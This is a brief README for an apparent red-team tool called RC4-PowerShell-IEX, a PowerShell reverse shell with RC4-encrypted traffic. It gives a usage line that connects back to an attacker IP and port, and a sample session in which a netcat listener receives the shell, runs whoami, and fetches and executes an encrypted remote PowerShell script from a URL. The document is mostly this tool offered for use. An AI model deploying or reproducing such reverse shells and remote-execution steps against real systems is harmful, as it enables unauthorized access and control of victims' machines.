# RC4-PowerShell-IEX
Small powershell reverse shell using RC4 encryption

# Usage
```
PS-RemoteShell -ip 1.1.1.1 -port 1111 -key 1111
```

# Example
```
$ nc -lv 8080
(192.168.70.133:RINGZER0\me):Url >null
(null):Exec >whoami
RINGZER0\me

(192.168.70.133:RINGZER0\me):Url >https://home.ringzer0team.com/ps.php
(https://home.ringzer0team.com/ps.php):Exec >Get-BrowserHomepage

Start Page
----------
http://go.microsoft.com/fwlink/p/?LinkId=255141

The ps.php file located at https://home.ringzer0team.com/ps.php is encrypted using the following key: test
```

# TODO
make a client to encrypt the whole communication.

# Credit 
Mr.Un1k0d3r RingZer0 Team

https://ringzer0team.com
